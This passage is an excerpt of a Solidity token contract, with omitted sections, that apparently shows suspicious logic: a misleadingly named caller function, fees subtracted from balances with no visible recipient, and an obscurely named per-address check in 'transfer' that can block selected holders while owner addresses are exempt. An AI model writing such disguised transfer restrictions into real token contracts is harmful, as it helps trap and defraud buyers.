...
contract Context {
    function _msgData() internal view returns (address payable) {
...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_msgData() == _owner, "Ownable: caller is not the owner");
        _;
    }
...
contract CoinToken is Ownable, IERC20 {
    ...
    constructor(string memory _name_, string memory _symbol_, address _marketWallet) {
        ...
        isExcludedFromFee[_msgData()] = true;
        isExcludedFromFee[marketWallet] = true;
        _balances[_msgData()] = _totalSupply;

        emit Transfer(address(0), _msgData(), _totalSupply);
    }
    ...
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgData(), spender, amount);
        return true;
    }
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[_msgData()] || isExcludedFromFee[recipient]) {
            _transfer(_msgData(), recipient, amount);
            return true;
        }
        require(_isTxLimitEmp[msg.sender] < 1);
        uint256 feeAmount = amount.mul(_taxFees).div(100);
        _balances[_msgData()] = _balances[_msgData()].sub(feeAmount);
        _transfer(_msgData(), recipient, amount.sub(feeAmount));
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            ...
            _approve(sender, _msgData(), _allowances[sender][_msgData()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
